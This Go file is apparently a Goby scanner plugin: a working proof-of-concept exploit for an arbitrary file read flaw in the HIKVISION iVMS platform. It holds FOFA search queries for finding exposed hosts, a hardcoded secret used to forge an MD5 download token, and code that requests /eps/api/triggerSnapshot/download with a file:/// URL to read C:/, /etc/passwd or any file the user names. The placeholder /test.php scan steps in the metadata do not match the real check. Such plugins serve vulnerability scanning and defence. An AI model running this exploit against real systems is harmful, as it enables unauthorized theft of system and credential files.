package exploits

import (
	"crypto/md5"
	"encoding/hex"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "HIKVISION iVMS download file reading vulnerability",
    "Description": "<p>HIKVISION iVMS integrated security management platform is a security protection platform produced by Hikvision.</p><p>The HIKVISION iVMS integrated security management platform has an arbitrary file reading vulnerability. An attacker can read directory information and sensitive files in the server by sending a specific request packet.</p>",
    "Product": "HIKVISION-iVMS",
    "Homepage": "https://www.hikvision.com/",
    "DisclosureDate": "2023-08-14",
    "PostTime": "2023-08-14",
    "Author": "m0x0is3ry@foxmail.com",
    "FofaQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\"",
    "GobyQuery": "title=\"综合安防管理平台\" || body=\"commonVar.js\" || body=\"nstallRootCert.exe\" || header=\"portal:8082\" || banner=\"portal:8082\" || cert=\"ga.hikvision.com\" || body=\"error/browser.do\" || body=\"InstallRootCert.exe\" || body=\"error/browser.do\" || body=\"2b73083e-9b29-4005-a123-1d4ec47a36d5\" || cert=\"ivms8700\" || title=\"iVMS-\" || body=\"code-iivms\" || body=\"g_szCacheTime\" || body=\"getExpireDateOfDays.action\" || body=\"//caoshiyan modify 2015-06-30 中转页面\" || body=\"/home/locationIndex.action\" || body=\"laRemPassword\" || body=\"LoginForm.EhomeUserName.value\" || (body=\"laCurrentLanguage\" && body=\"iVMS\") || header=\"Server: If you want know, you can ask me\" || banner=\"Server: If you want know, you can ask me\" || body=\"download/iVMS-\" || body=\"if (refreshurl == null || refreshurl == '') { window.location.reload();}\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filename",
            "type": "input",
            "value": "C:/",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Directory Traversal",
        "File Read"
    ],
    "VulType": [
        "Directory Traversal",
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "HIKVISION iVMS download 文件读取漏洞",
            "Product": "HIKVISION-iVMS",
            "Description": "<p>HIKVISION iVMS 综合安防管理平台是海康威视生产的一款安全防护平台。<br></p><p>HIKVISION iVMS 综合安防管理平台存在任意文件读取漏洞，攻击者通过发送特定的请求包可以读取服务器中的目录信息与敏感文件。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可以利用该漏洞读取重要的系统文件（如数据库配置文件、系统配置文件）、数据库配置文件等，使得网站不安全。<br></p>",
            "VulType": [
                "目录遍历",
                "文件读取"
            ],
            "Tags": [
                "目录遍历",
                "文件读取"
            ]
        },
        "EN": {
            "Name": "HIKVISION iVMS download file reading vulnerability",
            "Product": "HIKVISION-iVMS",
            "Description": "<p>HIKVISION iVMS integrated security management platform is a security protection platform produced by Hikvision.</p><p>The HIKVISION iVMS integrated security management platform has an arbitrary file reading vulnerability. An attacker can read directory information and sensitive files in the server by sending a specific request packet.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.hikvision.com/\">https://www.hikvision.com/</a></p><p>Temporary fix:</p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to read important system files (such as database configuration files, system configuration files), database configuration files, resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "Directory Traversal",
                "File Read"
            ],
            "Tags": [
                "Directory Traversal",
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10824"
}`

	sendPayload8903dd10 := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		h := md5.New()
		h.Write([]byte(hostInfo.FixedHostInfo + "/eps/api/triggerSnapshot/downloadsecretKeyIbuilding"))
		encoded := hex.EncodeToString(h.Sum(nil))
		cfg := httpclient.NewGetRequestConfig("/eps/api/triggerSnapshot/download?token=" + strings.ToUpper(encoded) + "&fileUrl=file:///" + filename + "&fileName=1")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfg)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, err := sendPayload8903dd10(u, "C:/")
			if err != nil {
				return false
			}
			if !strings.Contains(rsp.Utf8Html, "Program Files") {
				rsp, err = sendPayload8903dd10(u, "/etc/passwd")
				if err != nil {
					return false
				}
				return strings.Contains(rsp.Utf8Html, "root")
			}
			return true
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filename := goutils.B2S(ss.Params["filename"])
			rsp, err := sendPayload8903dd10(expResult.HostInfo, filename)
			if err != nil {
				expResult.Success = false
				expResult.Output = err.Error()
			} else {
				if strings.Contains(rsp.Utf8Html, "\"success\":false") {
					expResult.Success = false
					expResult.Output = "目标文件或文件夹不存在"
				} else {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html
				}
			}
			return expResult
		},
	))
}